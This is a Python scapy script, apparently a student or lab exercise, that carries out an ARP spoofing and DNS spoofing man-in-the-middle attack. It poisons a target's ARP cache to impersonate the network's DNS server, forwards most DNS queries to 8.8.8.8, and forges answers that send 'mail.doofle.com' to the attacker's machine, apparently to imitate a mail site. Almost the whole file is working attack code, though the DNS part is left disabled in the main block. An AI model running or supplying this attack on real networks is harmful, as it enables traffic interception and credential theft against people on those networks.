from typing import Dict, List
import multiprocessing as mp
from scapy.layers.l2 import getmacbyip, Ether, ARP
from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
import scapy.all as scapy
import time

DOOFENSHMIRTZ_IP = "192.168.1.178"  # Enter the computer you attack's IP.
SECRATERY_IP = "127.0.0.1"  # Enter the attacker's IP.
NETWORK_DNS_SERVER_IP = "192.168.1.27"  # "10.0.2.43"  # Enter the network's DNS server's IP.
SPOOF_SLEEP_TIME = 2

IFACE = "???"  # Enter the network interface you work on.

FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
    b"mail.doofle.com": FAKE_GMAIL_IP
}


class ArpSpoofer(object):
    """
    An ARP Spoofing process. Sends periodical ARP responses to given target
    in order to convince it we are a specific ip (e.g: default gateway).
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 target_ip: str, spoof_ip: str) -> None:
        """
        Initializer for the arp spoofer process.
        @param process_list global list of processes to append our process to.
        @param target_ip ip to spoof
        @param spoof_ip ip we want to convince the target we have.
        """
        process_list.append(self)
        self.process = None

        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.target_mac = None
        self.spoof_count = 0

    def get_target_mac(self) -> str:
        # TODO: catch the error & handle uninitialized
        """
        Returns the mac address of the target.
        If not initialized yet, sends an ARP request to the target and waits for a response.
        @return the mac address of the target.
        """
        arp_request = scapy.ARP(pdst=self.target_ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        self.target_mac = answered_list[0][1].hwsrc
        return self.target_mac

    def spoof(self) -> None:
        """
        Sends an ARP spoof that convinces target_ip that we are spoof_ip.
        Increases spoof count b y one.
        """
        packet = scapy.ARP(op=2, pdst=self.target_ip,
                           hwdst=self.target_mac,
                           psrc=self.spoof_ip)

        scapy.send(packet, verbose=False)
        self.spoof_count += 1

    def run(self) -> None:
        """
        Main loop of the process.
        """
        while True:
            self.spoof()
            time.sleep(SPOOF_SLEEP_TIME)

    def start(self) -> None:
        """
        Starts the ARP spoof process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


class DnsHandler(object):
    """
    A DNS request server process. Forwards some of the DNS requests to the
    default servers. However for specific domains this handler returns fake crafted
    DNS responses.
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 spoof_dict: Dict[str, str]):
        """
        Initializer for the dns server process.
        @param process_list global list of processes to append our process to.
        @param spoof_dict dictionary of spoofs.
            The keys: represent the domains we wish to fake,
            The values: represent the fake responses we want
                        from the domains.
        """
        process_list.append(self)
        self.process = None

        self.spoof_dict = spoof_dict
        self.real_dns_server_ip = REAL_DNS_SERVER_IP

    def get_real_dns_response(self, pkt: scapy.packet.Packet) -> scapy.packet.Packet:
        """
        Returns the real DNS  toresponse the given DNS request.
        Asks the default DNS servers (8.8.8.8) and forwards the response, only modifying
        the IP (change it to local IP).

        @param pkt DNS request from target.
        @return DNS response to pkt, source IP changed.
        """
        print(f"Forwarding: {pkt[DNSQR].qname}")
        response = sr1(
            IP(dst=self.real_dns_server_ip) /
            UDP(sport=pkt[UDP].sport) /
            DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
            verbose=0,
        )
        resp_pkt = IP(dst=pkt[IP].src, src=SECRATERY_IP) / UDP(dport=pkt[UDP].sport) / DNS()
        resp_pkt[DNS] = response[DNS]
        return resp_pkt

    def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
        """
        Returns a fake DNS response to the given DNS request.
        Crafts a DNS response leading to the ip adress 'to' (parameter).

        @param pkt DNS request from target.
        @param to ip address to return from the DNS lookup.
        @return fake DNS response to the request.
        """
        # todo: what to write instead of 53?
        # spf_resp = IP(dst=pkt[IP].src) / \
        #            UDP(dport=pkt[UDP].sport, sport=53) / \
        #            DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=to) /
        #                                              DNSRR(rrname=pkt[DNSRR].rrname, rdata=to))
        spf_resp = IP(dst=pkt[IP].src, src=SECRATERY_IP) / UDP(dport=pkt[UDP].sport) / \
                   DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=to) /
                   DNSRR(rrname=pkt[DNSRR].rrname, rdata=to))
        return spf_resp  # todo: what is it: , verbose=0, iface=IFACE)

    def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
        # todo: chenge the return values
        """
        Main handler for DNS requests. Based on the spoof_dict, decides if the packet
        should be forwarded to real dns server or should be treated with a crafted response.
        Calls either get_real_dns_response or get_spoofed_dns_response accordingly.

        @param pkt DNS request from target.
        @return string describing the choice made
        """
        if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:  # todo: check what doet it mean
            host_name = pkt["DNS Question Record"].qname
            if host_name in self.spoof_dict:
                return self.get_spoofed_dns_response(pkt, self.spoof_dict[host_name])
            else:
                return self.get_real_dns_response(pkt)

    def run(self) -> None:
        """
        Main loop of the process. Sniffs for packets on the interface and sends DNS
        requests to resolve_packet. For every packet which passes the filter, self.resolve_packet
        is called and the return value is printed to the console.
        """
        while True:
            try:
                scapy.sniff(filter=DNS_FILTER, prn=self.resolve_packet)
            except:
                import traceback
                traceback.print_exc()

    def start(self) -> None:
        """
        Starts the DNS server process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


if __name__ == "__main__":
    plist = []
    spoofer = ArpSpoofer(plist, DOOFENSHMIRTZ_IP, NETWORK_DNS_SERVER_IP)
    spoofer.get_target_mac()
    spoofer.run()
    print(spoofer.target_mac)
    # server = DnsHandler(plist, SPOOF_DICT)
    #
    # print("Starting sub-processes...")
    # server.start()
    # spoofer.start()
